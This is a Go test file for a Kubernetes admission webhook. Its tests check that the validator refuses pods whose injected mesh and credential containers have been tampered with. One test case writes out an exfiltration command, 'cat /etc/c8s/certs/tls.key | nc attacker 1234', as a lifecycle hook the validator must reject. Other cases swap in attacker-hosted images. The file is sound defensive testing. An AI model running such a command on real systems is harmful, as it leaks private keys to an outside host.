package webhook

import (
	"context"
	"encoding/json"
	"strings"
	"testing"

	corev1 "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/util/intstr"
	"sigs.k8s.io/controller-runtime/pkg/webhook/admission"

	"github.com/confidential-dot-ai/c8s/pkg/workloadclaims"
)

// validate runs the validator over pod and reports the response.
func validate(t *testing.T, v *podValidator, pod *corev1.Pod, namespace string) admission.Response {
	t.Helper()
	raw, err := json.Marshal(pod)
	if err != nil {
		t.Fatal(err)
	}
	return v.Handle(context.Background(), podRequest(namespace, raw, ""))
}

func denies(t *testing.T, v *podValidator, pod *corev1.Pod, want string) {
	t.Helper()
	resp := validate(t, v, pod, "tenant")
	if resp.Allowed {
		t.Fatalf("validator admitted the pod; want a denial mentioning %q", want)
	}
	if resp.Result == nil || !strings.Contains(resp.Result.Message, want) {
		t.Fatalf("denial = %+v, want it to mention %q", resp.Result, want)
	}
}

// The mutator's own output is admitted: the two webhooks agree on the shape.
func TestValidatorAdmitsInjectedPod(t *testing.T) {
	m, v := meshHandlers(t, meshConfig())
	pod := podWithApp()
	pod.Annotations = map[string]string{AnnotationWorkload: "api"}
	pod.Spec.InitContainers = []corev1.Container{{Name: "migrate"}}

	if resp := validate(t, v, admit(t, m, pod, "tenant"), "tenant"); !resp.Allowed {
		t.Fatalf("validator denied an injected pod: %+v", resp.Result)
	}
}

// The injected shape is re-derived from the pod, so an UPDATE of a stored pod
// (whose fields the API server has defaulted) is admitted while the same pod
// with a swapped mesh image is not (M3).
func TestValidatorJudgesStoredPodOnUpdate(t *testing.T) {
	m, v := meshHandlers(t, meshConfig())
	stored := defaulted(admit(t, m, podWithApp(), "tenant"))

	raw, err := json.Marshal(stored)
	if err != nil {
		t.Fatal(err)
	}
	if resp := v.Handle(context.Background(), podRequest("tenant", raw, "")); !resp.Allowed {
		t.Fatalf("validator denied a stored injected pod: %+v", resp.Result)
	}

	containerNamed(stored, reservedMeshContainerName).Image = "ghcr.io/attacker/mesh:latest"
	denies(t, v, stored, "image")
}

// defaulted applies the API-server defaults a stored pod carries but an
// admission patch does not, so an UPDATE case is judged on a realistic object.
func defaulted(pod *corev1.Pod) *corev1.Pod {
	out := pod.DeepCopy()
	for i := range out.Spec.InitContainers {
		c := &out.Spec.InitContainers[i]
		c.TerminationMessagePath = corev1.TerminationMessagePathDefault
		c.TerminationMessagePolicy = corev1.TerminationMessageReadFile
		for _, probe := range []*corev1.Probe{c.StartupProbe, c.ReadinessProbe} {
			if probe != nil && probe.HTTPGet != nil {
				probe.HTTPGet.Scheme = corev1.URISchemeHTTP
			}
		}
		for j := range c.Env {
			if c.Env[j].ValueFrom != nil && c.Env[j].ValueFrom.FieldRef != nil {
				c.Env[j].ValueFrom.FieldRef.APIVersion = "v1"
			}
		}
	}
	return out
}

// A pod in scope that reached the API server without injection is refused:
// deleting the mutating webhook removes injection, not admission (M3).
func TestValidatorRejectsUninjectedPod(t *testing.T) {
	_, v := meshHandlers(t, meshConfig())
	denies(t, v, podWithApp(), "containers are")
}

// Each way of weakening a platform container is refused on its own.
func TestValidatorRejectsWeakenedPlatformContainers(t *testing.T) {
	m, v := meshHandlers(t, meshConfig())
	injected := admit(t, m, podWithApp(), "tenant")

	cases := []struct {
		name   string
		mutate func(pod *corev1.Pod)
		want   string
	}{
		{"mesh arguments", func(pod *corev1.Pod) {
			mesh := containerNamed(pod, reservedMeshContainerName)
			mesh.Args = append(mesh.Args, "--health-port=9999")
		}, "args"},
		{"credential paths", func(pod *corev1.Pod) {
			mesh := containerNamed(pod, reservedMeshContainerName)
			mesh.Args[1] = "--cert-path=/tmp/leaf.pem"
		}, "args"},
		{"mesh uid", func(pod *corev1.Pod) {
			containerNamed(pod, reservedMeshContainerName).SecurityContext.RunAsUser = new(int64(0))
		}, "securityContext"},
		{"added capability", func(pod *corev1.Pod) {
			sc := containerNamed(pod, reservedMeshContainerName).SecurityContext
			sc.Capabilities.Add = []corev1.Capability{"NET_ADMIN"}
		}, "securityContext"},
		{"exec probe", func(pod *corev1.Pod) {
			mesh := containerNamed(pod, reservedMeshContainerName)
			mesh.StartupProbe = &corev1.Probe{ProbeHandler: corev1.ProbeHandler{
				Exec: &corev1.ExecAction{Command: []string{"/bin/true"}},
			}}
		}, "startupProbe"},
		{"probe port", func(pod *corev1.Pod) {
			mesh := containerNamed(pod, reservedMeshContainerName)
			mesh.ReadinessProbe.HTTPGet.Port = intstr.FromInt32(8080)
		}, "readinessProbe"},
		{"credential mount dropped", func(pod *corev1.Pod) {
			containerNamed(pod, reservedMeshContainerName).VolumeMounts = nil
		}, "volumeMounts"},
		{"get-cert image", func(pod *corev1.Pod) {
			containerNamed(pod, reservedCertContainerName).Image = "ghcr.io/attacker/get-cert:latest"
		}, "image"},
		{"lifecycle hook", func(pod *corev1.Pod) {
			containerNamed(pod, reservedMeshContainerName).Lifecycle = &corev1.Lifecycle{
				PostStart: &corev1.LifecycleHandler{Exec: &corev1.ExecAction{
					Command: []string{"sh", "-c", "cat /etc/c8s/certs/tls.key | nc attacker 1234"},
				}},
			}
		}, "lifecycle"},
		{"envFrom source", func(pod *corev1.Pod) {
			containerNamed(pod, reservedCertContainerName).EnvFrom = []corev1.EnvFromSource{{
				ConfigMapRef: &corev1.ConfigMapEnvSource{
					LocalObjectReference: corev1.LocalObjectReference{Name: "attacker"},
				},
			}}
		}, "envFrom"},
		{"local image", func(pod *corev1.Pod) {
			containerNamed(pod, reservedMeshContainerName).ImagePullPolicy = corev1.PullNever
		}, "imagePullPolicy"},
		{"declared port", func(pod *corev1.Pod) {
			mesh := containerNamed(pod, reservedMeshContainerName)
			mesh.Ports = []corev1.ContainerPort{{ContainerPort: workloadclaims.MeshHealthPort, HostPort: 15021}}
		}, "ports"},
		{"endpoint removed", func(pod *corev1.Pod) {
			pod.Spec.InitContainers = pod.Spec.InitContainers[1:]
		}, "containers are"},
		{"endpoint reordered", func(pod *corev1.Pod) {
			pod.Spec.InitContainers[0], pod.Spec.InitContainers[1] = pod.Spec.InitContainers[1], pod.Spec.InitContainers[0]
		}, "containers are"},
		{"credential wait dropped", func(pod *corev1.Pod) {
			pod.Spec.InitContainers = pod.Spec.InitContainers[:2]
		}, "containers are"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			pod := injected.DeepCopy()
			tc.mutate(pod)
			denies(t, v, pod, tc.want)
		})
	}
}

// Resources the injector owns cannot be occupied by the pod itself (M2).
func TestValidatorRejectsReservedResources(t *testing.T) {
	m, v := meshHandlers(t, meshConfig())
	injected := admit(t, m, podWithApp(), "tenant")

	cases := []struct {
		name   string
		mutate func(pod *corev1.Pod)
		want   string
	}{
		{"workload mounts the credentials", func(pod *corev1.Pod) {
			pod.Spec.Containers[0].VolumeMounts = []corev1.VolumeMount{
				{Name: defaultCertVolumeName, MountPath: "/creds", ReadOnly: true},
			}
		}, "private credentials"},
		{"workload takes a reserved name", func(pod *corev1.Pod) {
			pod.Spec.Containers[0].Name = reservedMeshContainerName
		}, "reserved"},
		{"credential volume on disk", func(pod *corev1.Pod) {
			pod.Spec.Volumes = []corev1.Volume{{
				Name:     defaultCertVolumeName,
				EmptyDir: &corev1.EmptyDirVolumeSource{},
			}}
		}, "memory-backed"},
		{"host network", func(pod *corev1.Pod) { pod.Spec.HostNetwork = true }, "hostNetwork"},
		{"shared process namespace", func(pod *corev1.Pod) {
			pod.Spec.ShareProcessNamespace = new(true)
		}, "shareProcessNamespace"},
		{"host pid", func(pod *corev1.Pod) { pod.Spec.HostPID = true }, "hostPID"},
		{"host ipc", func(pod *corev1.Pod) { pod.Spec.HostIPC = true }, "hostIPC"},
		{"nginx reload", func(pod *corev1.Pod) {
			pod.Annotations[AnnotationWorkload] = "api"
			pod.Annotations[AnnotationReloadNginx] = "true"
		}, AnnotationReloadNginx},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			pod := injected.DeepCopy()
			tc.mutate(pod)
			denies(t, v, pod, tc.want)
		})
	}
}

// An ephemeral container may not reach the pod's credentials, whichever
// webhook sees it.
func TestValidatorRejectsEphemeralCredentialMount(t *testing.T) {
	m, v := meshHandlers(t, meshConfig())
	pod := admit(t, m, podWithApp(), "tenant")
	pod.Spec.EphemeralContainers = []corev1.EphemeralContainer{{
		EphemeralContainerCommon: corev1.EphemeralContainerCommon{
			Name: "debugger",
			VolumeMounts: []corev1.VolumeMount{
				{Name: defaultCertVolumeName, MountPath: "/creds"},
			},
		},
	}}
	raw, err := json.Marshal(pod)
	if err != nil {
		t.Fatal(err)
	}

	resp := v.Handle(context.Background(), podRequest("tenant", raw, "ephemeralcontainers"))
	if resp.Allowed {
		t.Fatal("validator admitted an ephemeral container mounting the credential volume")
	}
}

// The released secrets stay read-only for the workload: the fetcher is the only
// writer, so a container able to write the directory could replace a value
// another container has yet to read.
func TestValidatorRejectsWritableSecretsMount(t *testing.T) {
	cfg := meshConfig()
	cfg.WorkloadClaimsHostDir = "/run/c8s-node"
	m, v := meshHandlers(t, cfg)
	pod := podWithApp()
	pod.Annotations = map[string]string{
		AnnotationWorkload: "api",
		AnnotationSecrets:  "token=/store/token",
	}

	injected := admit(t, m, pod, "tenant")
	if resp := validate(t, v, injected, "tenant"); !resp.Allowed {
		t.Fatalf("validator denied an injected pod: %+v", resp.Result)
	}

	writable := injected.DeepCopy()
	containerMount(&writable.Spec.Containers[0], secretsVolumeName).ReadOnly = false
	denies(t, v, writable, "volumeMounts")
}

// An ephemeral container may not borrow a platform container's namespaces or
// the mesh role's UID: both read the credentials without mounting anything.
func TestValidatorRejectsEphemeralReach(t *testing.T) {
	m, v := meshHandlers(t, meshConfig())
	injected := admit(t, m, podWithApp(), "tenant")

	cases := []struct {
		name      string
		ephemeral corev1.EphemeralContainer
	}{
		{"targets a platform container", corev1.EphemeralContainer{
			EphemeralContainerCommon: corev1.EphemeralContainerCommon{Name: "debugger"},
			TargetContainerName:      reservedMeshContainerName,
		}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			pod := injected.DeepCopy()
			pod.Spec.EphemeralContainers = []corev1.EphemeralContainer{tc.ephemeral}
			raw, err := json.Marshal(pod)
			if err != nil {
				t.Fatal(err)
			}
			if resp := v.Handle(context.Background(), podRequest("tenant", raw, "ephemeralcontainers")); resp.Allowed {
				t.Fatalf("validator admitted an ephemeral container that %s", tc.name)
			}
		})
	}
}

// An operator image bump must not deny every metadata write on the pods
// admitted before it: an UPDATE that leaves the spec alone is admitted, while
// one that changes it is judged against the new shape.
func TestValidatorAdmitsUnchangedSpecAfterImageBump(t *testing.T) {
	m, v := meshHandlers(t, meshConfig())
	stored := admit(t, m, podWithApp(), "tenant")
	raw, err := json.Marshal(stored)
	if err != nil {
		t.Fatal(err)
	}

	bumped := meshConfig()
	bumped.MeshImage = testMeshImage + "-next"
	v.cfg = bumped

	labelled := stored.DeepCopy()
	labelled.Labels = map[string]string{"team": "payments"}
	labelledRaw, err := json.Marshal(labelled)
	if err != nil {
		t.Fatal(err)
	}
	if resp := v.Handle(context.Background(), podUpdateRequest("tenant", raw, labelledRaw)); !resp.Allowed {
		t.Fatalf("validator denied a metadata-only update after an image bump: %+v", resp.Result)
	}

	changed := stored.DeepCopy()
	changed.Spec.Containers[0].Image = "ghcr.io/tenant/app:v2"
	changedRaw, err := json.Marshal(changed)
	if err != nil {
		t.Fatal(err)
	}
	if resp := v.Handle(context.Background(), podUpdateRequest("tenant", raw, changedRaw)); resp.Allowed {
		t.Fatal("validator admitted a spec change whose mesh image is stale")
	}
}

// The cw label is refused without its annotation even where the webhook injects
// nothing: the managed Services select on that label.
func TestValidatorRejectsCWLabelOutsideScope(t *testing.T) {
	_, v := meshHandlers(t, secretsConfig().withDefaults())
	pod := podWithApp()
	pod.Labels = map[string]string{LabelWorkload: "api"}

	denies(t, v, pod, "must match")
}
